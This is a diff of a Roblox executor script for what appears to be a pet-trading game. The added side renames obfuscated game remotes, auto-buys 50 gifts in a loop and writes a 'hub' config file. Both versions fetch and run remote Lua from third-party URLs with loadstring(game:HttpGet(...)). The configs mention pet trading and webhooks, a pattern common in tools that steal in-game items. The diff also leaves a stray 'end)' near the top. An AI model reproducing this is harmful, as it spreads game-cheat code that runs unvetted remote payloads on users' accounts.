@@ -1,123 +1,49 @@
-task.spawn(function()
-task.wait(23)
-    -- Load external script
-    loadstring(game:HttpGet(('https://raw.githubusercontent.com/ReQiuYTPL/hub/main/ReQiuYTPLHub.lua'), true))()
+local function rename(remotename,hashedremote)
+    hashedremote.Name = remotename
+end
+
+table.foreach(getupvalue(require(game:GetService("ReplicatedStorage"):WaitForChild("Fsys")).load("RouterClient").init,4),rename)
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/ReQiuYTPL/hub/main/ReQiuYTPLHub.lua'), true))()
 end)
-task.wait(5)
-_G.hideUnHide()
--- Create the ScreenGui
-local screenGui = Instance.new("ScreenGui")
-screenGui.Name = "PetShopGui"
-screenGui.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
-
--- Frame to hold the GUI elements
-local mainFrame = Instance.new("Frame")
-mainFrame.Size = UDim2.new(0, 300, 0, 200)
-mainFrame.Position = UDim2.new(0.5, -150, 0.5, -100)
-mainFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-mainFrame.Parent = screenGui
-
--- Title Label
-local titleLabel = Instance.new("TextLabel")
-titleLabel.Text = "Pet Buyer"
-titleLabel.Size = UDim2.new(1, 0, 0, 30)
-titleLabel.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-titleLabel.TextColor3 = Color3.new(1, 1, 1)
-titleLabel.Parent = mainFrame
-
--- Start Button
-local startButton = Instance.new("TextButton")
-startButton.Text = "Start Buying"
-startButton.Size = UDim2.new(1, 0, 0, 40)
-startButton.Position = UDim2.new(0, 0, 0, 40)
-startButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
-startButton.TextColor3 = Color3.new(1, 1, 1)
-startButton.Parent = mainFrame
-
--- Stop Button
-local stopButton = Instance.new("TextButton")
-stopButton.Text = "Stop Buying"
-stopButton.Size = UDim2.new(1, 0, 0, 40)
-stopButton.Position = UDim2.new(0, 0, 0, 90)
-stopButton.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
-stopButton.TextColor3 = Color3.new(1, 1, 1)
-stopButton.Parent = mainFrame
-
--- Status Label
-local statusLabel = Instance.new("TextLabel")
-statusLabel.Text = "Status: Idle"
-statusLabel.Size = UDim2.new(1, 0, 0, 30)
-statusLabel.Position = UDim2.new(0, 0, 0, 140)
-statusLabel.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
-statusLabel.TextColor3 = Color3.new(1, 1, 1)
-statusLabel.Parent = mainFrame
-
--- Variables to control the buying loop
-local isBuying = false
-
--- Function to start buying
-local function startBuying()
-    statusLabel.Text = "Status: Buying..."
-    isBuying = true
-
-    -- Define purchase arguments for "halloween_2024_scarebear"
+task.wait(10)
+-- Function to buy a massive gift
+local function buyMassiveGift()
     local args = {
-        [1] = "pets",
-        [2] = "halloween_2024_scarebear",
+        [1] = "gifts",       -- Category: gifts
+        [2] = "massivegift", -- Item ID: massivegift
         [3] = {
-            ["buy_count"] = 1
+            ["buy_count"] = 1 -- Buy one item at a time
         }
     }
 
-    -- Purchase loop
-    task.spawn(function()
-        while isBuying do
-            local success, errorMsg = pcall(function()
-                game:GetService("ReplicatedStorage").API:FindFirstChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))
-            end)
-
-            -- Exit the loop if there's an error (e.g., insufficient funds)
-            if not success then
-                warn("Purchase failed: " .. tostring(errorMsg))
-                statusLabel.Text = "Status: Error - " .. tostring(errorMsg)
-                break
-            end
-
-            -- Optionally wait a short period between purchases to avoid server overload
-            task.wait(0.5)  -- Adjust the delay as needed
-        end
-        statusLabel.Text = "Status: Idle"
-    end)
+    -- Invoke the ShopAPI to buy the gift
+    game:GetService("ReplicatedStorage").API:FindFirstChild("ShopAPI/BuyItem"):InvokeServer(unpack(args))
 end
 
--- Function to stop buying
-local function stopBuying()
-    isBuying = false
-    statusLabel.Text = "Status: Stopped"
-end
-
--- Connect button clicks to their respective functions
-startButton.MouseButton1Click:Connect(startBuying)
-stopButton.MouseButton1Click:Connect(stopBuying)
-
--- Initial script setup
+-- Start purchasing process
 task.spawn(function()
-    -- Renames obfuscated remotes to be more readable
-    local function rename(remotename, hashedremote)
-        hashedremote.Name = remotename
+    local maxPurchases = 50 -- Set the maximum number of purchases
+    local purchaseCount = 0
+
+    while purchaseCount < maxPurchases do
+        buyMassiveGift() -- Call the function to buy the gift
+        purchaseCount = purchaseCount + 1
+        wait(0.1) -- Minimal delay between purchases (adjust if needed)
     end
 
-    table.foreach(getupvalue(require(game:GetService("ReplicatedStorage"):WaitForChild("Fsys")).load("RouterClient").init, 4), rename)
-end)
+    print("Finished purchasing " .. purchaseCount .. " massive gifts.")
 
-task.spawn(function()
-    task.wait(23)
-    getgenv().Config = {
-        ["username"] = "",
-        ["pets_to_trade"] = {"blazing_lion", "halloween_2024_scarebear"}  -- Changed to the new pet
-    }
-    getgenv().trade_status = true
-    getgenv().pets_unique_ids = {}
+    -- After all purchases are done, run the next task
+    task.spawn(function()
+        task.wait(5) -- Wait for 5 seconds
+        local jsonData = [[
+        {"toggles":{"autoopengifts":true},"inputs":[],"settings":{"hidemenu":"LeftControl"},"sliders":{"fpswithcpulimiter":5,"timebetweenwebhook":5},"dropdowns":{"petstotrade":[],"webhookstosend":[],"autochange_raritypets":[],"petselectedtotrade":[],"pettofarm":[]}}
+        ]]
 
-    loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/a5386bfa9bb03ae1da997e3078394366.lua"))()
+        makefolder("ProdigyX") -- Creates the folder "ProdigyX" if it doesn't already exist
+        writefile("ProdigyX/ReQiuHub-920587237.prodx", jsonData) -- Writes the JSON data to the specified file
+    end)
+
+    task.wait(10) -- Wait for 10 seconds before loading the script
+    loadstring(game:HttpGet(('https://raw.githubusercontent.com/ReQiuYTPL/hub/main/ReQiuYTPLHub.lua'), true))()
 end)
